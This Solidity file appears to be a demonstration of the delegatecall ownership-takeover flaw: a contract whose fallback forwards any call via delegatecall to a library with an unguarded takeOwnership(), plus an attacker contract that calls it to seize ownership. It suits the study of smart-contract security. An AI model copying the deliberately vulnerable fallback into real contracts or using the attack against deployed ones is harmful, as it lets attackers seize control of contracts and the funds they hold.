// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Lib {
    address public owner;

    function takeOwnership() public {
        owner = msg.sender;
    }
}

contract VulnerableContract {
    address public owner;
    Lib public lib;

    constructor(Lib _lib) {
        owner = msg.sender;
        lib = Lib(_lib);
    }
    fallback() external payable {
        (bool result, ) = address(lib).delegatecall(msg.data);
        require(result, "Lib call failed");
    }
    receive() external payable {}
}

contract AttackerContract {
    address public vulnerableContract;

    constructor(address _vulnerableContract) {
        vulnerableContract = _vulnerableContract;
    }
    function attack() public {
        (bool result, ) = vulnerableContract.call(abi.encodeWithSignature("takeOwnership()"));
        require(result, "Failed to take ownership");
    }
}














































